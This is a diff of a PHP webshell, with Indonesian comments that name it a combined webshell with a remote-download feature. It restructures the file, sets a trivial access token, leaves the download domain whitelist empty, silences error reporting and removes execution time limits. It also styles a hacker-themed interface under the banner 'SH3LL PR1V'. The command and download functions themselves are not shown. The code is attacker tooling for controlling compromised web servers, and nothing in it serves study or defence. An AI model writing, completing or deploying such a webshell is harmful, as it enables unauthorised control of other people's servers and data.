@@ -1,3 +1,18 @@
+
+
+<?php
+// combined_shell_with_secure_remotedl.php
+// Gabungan webshell (versi migrasi dari yang kamu kirim) + fitur remote download aman.
+// CONFIG: ubah sebelum dipakai
+define('REMOTE_DL_TOKEN', 'el');
+define('REMOTE_DL_BASEDIR', __DIR__ . '/downloads'); // pindah ke luar public_html jika mungkin
+$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
+// END CONFIG
+
+set_time_limit(0);
+error_reporting(0);
+
+echo <<<HTML
 <!DOCTYPE html>
 <html>
 <head>
@@ -12,7 +27,6 @@ body {
 }
 a { color: #00eaff; text-decoration: none; }
 a:hover { color: #b66bff; }
-
 table {
   width: 95%;
   border-collapse: collapse;
@@ -37,7 +51,6 @@ td {
   background: rgba(10, 5, 25, 0.4);
 }
 tr:hover td { background: rgba(130,50,255,0.1); }
-
 input, select, textarea {
   background: #0b0b18;
   color: #bfefff;
@@ -69,7 +82,6 @@ form {
 }
 ul { list-style:none; padding:0; margin:10px; text-align:center; }
 ul a { color:#b66bff; }
-
 pre {
   background: #0a0616;
   color: #b5caff;
@@ -93,23 +105,7 @@ h3 {
 </style>
 </head>
 <body>
-<?php
-// lalu paste seluruh script PHP kamu di sini (dari define('REMOTE_DL_TOKEN'... dst)
-?>
-</body>
-</html>
-<?php
-// combined_shell_with_secure_remotedl.php
-// Gabungan webshell (versi migrasi dari yang kamu kirim) + fitur remote download aman.
-// CONFIG: ubah sebelum dipakai
-define('REMOTE_DL_TOKEN', 'el');
-define('REMOTE_DL_BASEDIR', __DIR__ . '/downloads'); // pindah ke luar public_html jika mungkin
-$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
-// END CONFIG
-
-set_time_limit(0);
-error_reporting(0);
-
+HTML;
 // ----------------- Helper asli & util -----------------
 function author() {
     echo "<center><br>SH3LL PR1V</center>";
